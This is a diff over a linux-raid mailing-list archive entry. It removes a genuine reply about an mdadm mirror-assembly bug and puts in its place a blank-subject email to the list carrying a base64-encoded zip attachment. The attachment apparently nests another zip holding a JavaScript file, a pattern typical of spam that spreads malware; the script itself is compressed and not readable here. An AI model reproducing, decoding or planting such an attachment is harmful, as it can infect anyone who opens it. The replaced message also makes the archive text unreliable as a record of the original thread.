@@ -1,60 +1,116 @@
-From: Wols Lists <antlists@youngman.org.uk>
-Subject: Re: Wrong array assembly on boot?
-Date: Mon, 24 Jul 2017 21:20:42 +0100
-Message-ID: <5976569A.5040504@youngman.org.uk>
-References: <59739BDD.30307@yandex.ru> <597608BD.7080108@youngman.org.uk>
- <597611F6.20500@yandex.ru> <59764C40.4020503@youngman.org.uk>
- <59765183.1030508@yandex.ru>
+From: <hp@ice-cool.eu>
+Subject: (unknown)
+Date: Tue, 25 Jul 2017 20:01:10 -0000
+Message-ID: <150101287015.12761.15808014536415587771@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="EMAIL_89826583725_linux-raid.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <59765183.1030508@yandex.ru>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-raid-owner@vger.kernel.org
-To: Dark Penguin <darkpenguin@yandex.ru>, linux-raid@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On 24/07/17 20:58, Dark Penguin wrote:
-> On 24/07/17 22:36, Wols Lists wrote:
->> On 24/07/17 16:27, Dark Penguin wrote:
->>> On 24/07/17 17:48, Wols Lists wrote:
->>>>> On 22/07/17 19:39, Dark Penguin wrote:
->>>>>>> Greetings!
->>>>>>>
->>>>>>> I have a mirror RAID with two devices (sdc1 and sde1). It's not a root
->>>>>>> partition, just a RAID with some data for services running on this
->>>>>>> server. (I'm running Debian Jessie x86_64 with a 4.1.18 kernel.) The
->>>>>>> RAID is listed in /etc/mdadm, and it has an external bitmap in /RAID .
->>>>>
->>>>> As an absolute minimum, can you please give us your version of mdadm.
->>> Oh, right, sorry. I thought the "absolute minimum" would be the kernel
->>> version and the distribution. :)
->>>
->>> mdadm - v3.3.2 - 21st August 2014
->>>
->>>
->> I was afraid it might be that ...
->>
->> You've hit a known bug in mdadm. It doesn't always successfully assemble
->> a mirror. I had exactly that problem - I created one mirror and when I
->> rebooted I had two ...
->>
->> Can't offer any advice about how to fix your damaged mirror, but you
->> need to upgrade mdadm! That's two minor versions out of date - 3.4 and 4.0.
->>
->> Cheers,
->> Wol
-> 
-> My mirror is not damaged anymore - it's quite healthy and cleanly
-> missing some information I've overwritten. :) Of course, there's no way
-> to help that now - that's what backups are for. I just wanted to learn
-> how to avoid this situation in the future. And learn how is it really
-> supposed to handle such things.
-> 
-> Is this bug fixed in the newer mdadm? Or is it "known, but not fixed yet"?
-> 
-> 
-Long fixed :-)
-
-Cheers,
-Wol
+UEsDBAoAAAAAAPGe+Uo2tzJ2+RUAAPkVAAAJAAAAMjUzMjEuemlwUEsDBBQAAAAIAPGe+UqyON8Q
+YxUAAJigAAAIAAAAMjUzMjEuanO9XW1zU1UQ/u6M/6GTmYzt6GhIxbTD9EPeatCWYlsN1fFDmtw0
+wTQNyW3T6vjfQBBfKgUEeVcBUZAXBREQLOKNqOfZZJc95xL90tl7e3PvObt79uzZs8/Zl156ePPW
+3ttH7q0f+GLjwp3P953+46Mbm3d/PPPL+Z+PP/r67P1Dn158eGTj2g+nTt795Nxnxw7e+Wjf1Z8P
+PTx678zdsx8fW/9q45vNw3svf3L+xLVz94///sej8wdvXjt898zt304f++nUD8c/vnfoq/ufHjl7
+7JtTtz7d99uNR78fOL3/+7uXN7+8ePTcpY29J2/+fPezo+t3ru+7cOnHw2dP/HL13sX9x/YeOHXu
+ixPXftp76/OvHm3c+PbQ9/u/O3P9133392/eOHXrxPmTHx0489Wj61fW7x778sHFO6dvHz6yfv/g
+5vHDn319+pMTv1659ODIxyev/nL+4c/3vj174+trH61vntg49+mVIweO37zw271v9313+cHRX67/
+cPD2hW9+/3rj+JFDmze++Pzkxwdvfnf50p2j1+4d+uTr9fufXjn6/YONqwdO3L1x4Y8vL+3/Zt+5
+j66c/v3O/ZM/Xt48e/P2+pEfzvz6ybe39h/449DFn/ZePffFwR839l94dHjvx98/WD+3eeXUwwPX
+b9387Pizz7zV2jFf3r1rya+3mzO5N/OTY5GFyPMRzw/+zHnBn0Izsm1gYWZqtvF6vl2aT6amt+8a
+i8SD/8S2JCLbnn1mrZqZz7ZbydTuuQlvpTT7RmNhYGzguXYjP10tZVuTjfrSdkPuMWS5MjeZXTLX
+SUOOv77LXOQndrxqrnYacsCQY3C3bmjPkG36u95vFv3qirdrytyYN+RuD54zpG/IwQh8oAXPNKuG
+brA/fdGQMxX4UK1m6Ighh7axPZk05FsFQ9ehE29Mv2au3jcktrD8trl4L2fo1Jyh18YFzrPcbmwn
+Mjd0IH1zQaVvaNQDQ04YcochX90JTJ0GTi4YEm8Dm0ogSeB67nX40iQI4XmQGQi1Wa3DV1+EfoNC
+LC2mK2wjmoZML5U8tkmjhowPQXugbS1D4nd9kE6h6UWkLhiadMaQQrfgq/+SQVcNjZ1uprnHbToN
+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
+BQYAAAAAAQABAFsAAAAgFgAAAAA=
